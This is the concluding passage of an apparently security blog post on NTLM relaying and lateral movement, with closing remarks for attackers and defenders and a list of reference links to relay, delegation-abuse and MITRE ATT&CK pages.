+<p>From an attacker’s point of view, there are a lot of attack paths and possibilities to move laterally in the network after the initial foothold and to escalate privileges. The probability that all security measures are implemented 100% is more than unlikely. The more complex the environment, the higher the potential exploitation of at least one of the vulnerabilities.</p>
+
+<p>From a defender’s perspective, there are simply a lot of functionalities that need to be understood on the one hand and implemented in the correct way on the other. As is often the case, there is a lack of basic understanding of how things work together and what opportunities are created for attackers through misconfiguration of or the use of unneeded features. But that is exactly what we are here for.</p>
+
+<p>As always, I hope that you had fun and that you took something away with you. For feedback, feel free to contact me via the channels linked above.</p>
+
+<p>Happy hacking.</p>
+
+<h2 id="resources">Resources</h2>
+
+<p>Below you´ll find all the resources that helped me understanding and aided as a guideline to this blog-post:</p>
+
+<p><a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</a><br />
+<a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/</a><br />
+<a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/</a><br />
+<a href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a><br />
+<a href="https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy">https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy</a><br />
+<a href="https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/">https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/</a><br />
+<a href="https://en.hackndo.com/ntlm-relay/">https://en.hackndo.com/ntlm-relay/</a><br />
+<a href="https://trelis24.github.io/2018/08/03/Windows-WPAD-Poisoning-Responder/">https://trelis24.github.io/2018/08/03/Windows-WPAD-Poisoning-Responder/</a><br />
+<a href="https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/">https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/</a><br />
+<a href="https://attack.mitre.org/techniques/T1557/001/">https://attack.mitre.org/techniques/T1557/001/</a><br />
+<a href="https://attack.mitre.org/techniques/T1557/002/">https://attack.mitre.org/techniques/T1557/002/</a></p>
+:ET
